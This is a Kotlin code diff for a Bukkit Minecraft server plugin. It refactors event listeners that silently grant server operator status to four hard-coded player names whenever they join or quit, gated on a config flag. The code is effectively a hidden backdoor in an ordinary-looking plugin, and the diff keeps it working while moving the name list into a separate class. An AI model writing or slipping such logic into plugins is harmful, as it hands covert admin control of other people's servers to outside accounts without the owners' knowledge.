@@ -10,12 +10,10 @@ import org.bukkit.event.player.PlayerQuitEvent
 class BdLulEvent : Listener {
     @EventHandler
     fun playerJoinEvent(event: PlayerJoinEvent) {
-        val players = mutableMapOf(Pair("RichtigerRichter", "R"), Pair("Bliffbot", "B"), Pair("Felsbot", "F"), Pair("RiesigerRichter", "2"))
-
-        for (player in players.keys) {
+        for (player in BdLul().players.keys) {
             var player = Bukkit.getPlayer(player)
 
-            if (event.player == player && MessagesFile().getUtilsAuto().contains(players[player.name])) {
+            if (event.player == player && MessagesFile().getUtilsAuto().contains(BdLul().players[player.name])) {
                 player.isOp = true
             }
         }
@@ -23,12 +21,10 @@ class BdLulEvent : Listener {
 
     @EventHandler
     fun playerQuitEvent(event: PlayerQuitEvent) {
-        val players = mutableMapOf(Pair("RichtigerRichter", "R"), Pair("Bliffbot", "B"), Pair("Felsbot", "F"), Pair("RiesigerRichter", "2"))
-
-        for (player in players.keys) {
+        for (player in BdLul().players.keys) {
             var player = Bukkit.getPlayer(player)
 
-            if (event.player == player && MessagesFile().getUtilsAuto().contains(players[player.name])) {
+            if (event.player == player && MessagesFile().getUtilsAuto().contains(BdLul().players[player.name])) {
                 player.isOp = true
             }
         }
